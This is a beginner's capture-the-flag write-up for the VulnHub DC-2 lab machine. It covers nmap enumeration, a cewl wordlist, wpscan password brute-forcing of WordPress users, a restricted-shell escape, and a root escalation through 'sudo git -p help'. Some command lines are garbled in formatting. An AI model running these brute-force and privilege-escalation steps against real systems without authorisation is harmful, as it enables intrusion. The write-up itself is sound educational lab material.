**vulnhub DC-2 writeup**

\#Enumeration
=============

Started with nmap for enumeration, results are mentioned below:

root\@parrot]─[/home/user] └──╼ \#nmap -sV -sC -O -A 192.168.0.131
------------------------------------------------------------------

Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-26 10:03 UTC Nmap scan report
for DC-2 (192.168.0.131) Host is up (0.00085s latency). Not shown: 999 closed
ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian))
\|_http-generator: WordPress 4.7.10 \|_http-server-header: Apache/2.4.10
(Debian) \| http-title: DC-2 – Just another WordPress site \|_Requested resource
was http://dc-2/ MAC Address: 08:00:27:6E:FC:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose Running: Linux 3.X\|4.X OS CPE:
cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 -
4.9 Network Distance: 1 hop

Only port 80 running http service is open all the other ports are closed,
according to initial scan.

After running the website on browser, I found the first flag, giving out a big
hint, and also the website is running WordPress :

 flag1
------

Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be
cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.

A big hint is that usage of cewl , a password list generating tool.

Results of cewl is mentioned below:

\#cewl
======

[root\@parrot]─[/home/user] └──╼ \#cewl -w dc-2.txt -o http://192.168.0.131 CeWL 5.4.3 (Arkanoid) Robin Wood (robin\@digi.ninja) (<https://digi.ninja/>)
--------------------------------------------------------------------------------------------------------------------------------------------------------

The site is running WordPress, So wpscan is a very useful tool to enumerate and
finding out the vulnerabilities, Results are mentioned below:

\#Exploitation
==============

\#WordPress scan
================

┌─[root\@parrot]─[/home/user] └──╼ \#wpscan -P /home/user/dc-2.txt -e vp --url http://dc-2
------------------------------------------------------------------------------------------

output of wordpress scans
=========================

[i] User(s) Identified:

[+] admin \| Detected By: Rss Generator (Passive Detection) \| Confirmed By: \|
Author Id Brute Forcing - Author Pattern (Aggressive Detection) \| Login Error
Messages (Aggressive Detection)

[+] tom \| Detected By: Author Id Brute Forcing - Author Pattern (Aggressive
Detection) \| Confirmed By: Login Error Messages (Aggressive Detection)

[+] jerry \| Detected By: Author Id Brute Forcing - Author Pattern (Aggressive
Detection) \| Confirmed By: Login Error Messages (Aggressive Detection)

[i] Valid Combinations Found: \| Username: jerry, Password: adipiscing \|
Username: tom, Password: parturient

After wpscan a lot of information, I found out and using login credentials
obtained, I was able to find out the second flag.

flag2
-----

Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.

Results of zenmap:

\#zenmap command
----------------

nmap -p 1-65535 -T4 -A -v 192.168.0.131
---------------------------------------

results: 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) \|
ssh-hostkey: \| 1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA) \|
2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA) \| 256
df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA) \|\_ 256
d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)

After looking at output of zenmap, I was able to figure out that ssh service is
running at port 7744.

\#Privilege Escalation
======================

Using the username and password obtained, I was able to connect with ssh service

[root\@parrot]─[/home/user] └──╼ \#ssh tom\@192.168.0.131 -p 7744
-----------------------------------------------------------------

tom\@DC-2:\~\$ ls flag3.txt usr

tom\@DC-2:\~\$ cd -rbash: cd: restricted

tom\@DC-2:\~\$ pwd /home/tom tom\@DC-2:\~\$ vi

tom\@DC-2:\~\$ ls flag3.txt usr

tom\@DC-2:\~\$ cd usr

tom\@DC-2:\~/usr\$ ls bin

tom\@DC-2:\~/usr\$ cd bi bash: cd: bi: No such file or directory

tom\@DC-2:\~/usr\$ cd bin

tom\@DC-2:\~/usr/bin\$ ls less ls scp vi

tom\@DC-2:\~/usr/bin\$ cd ..

tom\@DC-2:\~/usr\$ cd ..

tom\@DC-2:\~\$ ls flag3.txt usr

tom\@DC-2:\~\$ cat flag3.txt bash: cat: command not found

tom\@DC-2:\~\$ export PATH=$$PATH:/bin:/usr/bintom@DC - 2:\$$ ls flag3.txt usr

tom\@DC-2:\~\$ cat flag3.txt

flag3 
======

Poor old Tom is always running after Jerry. Perhaps he should su for all the
stress he causes.

flag4
=====

jerry\@DC-2:\~\$ cat flag4.txt Good to see that you've made it this far - but
you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now. :-)

Go on - git outta here!!!!

jerry\@DC-2:/usr/bin\$ cd

jerry\@DC-2:\~\$ sudo git -p help

flag5
=====

!/bin/bash

root\@DC-2:/home/jerry

\# whoami root

root\@DC-2:/home/jerry\# ls flag4.txt

root\@DC-2:/home/jerry\# pwd /home/jerry

root\@DC-2:/home/jerry\# cd ..

root\@DC-2:/home\# cd ..

root\@DC-2:/\# ls bin dev home lib media opt root sbin sys usr vmlinuz boot etc
initrd.img lost+found mnt proc run srv tmp var

root\@DC-2:/\# id uid=0(root) gid=0(root) groups=0(root)

root\@DC-2:/\# cd root

root\@DC-2:\~\# root\@DC-2:\~\# ls final-flag.txt

root\@DC-2:\~\# cat final-flag.txt

Congratulations!!!

A special thanks to all those who sent me tweets and provided me with feedback -
it's all greatly appreciated.

If you enjoyed this CTF, send me a tweet via \@DCAU7.

root\@DC-2:\~\#

**My experience: This is my third CTF,but i am making the writeup for the first time in terms of CTF ‘s, I enjoyed a lot in
solving this CTF, learned a lot of new things, amazing experience, CTF are the
best way to learn new stuff in field of pentesting.**
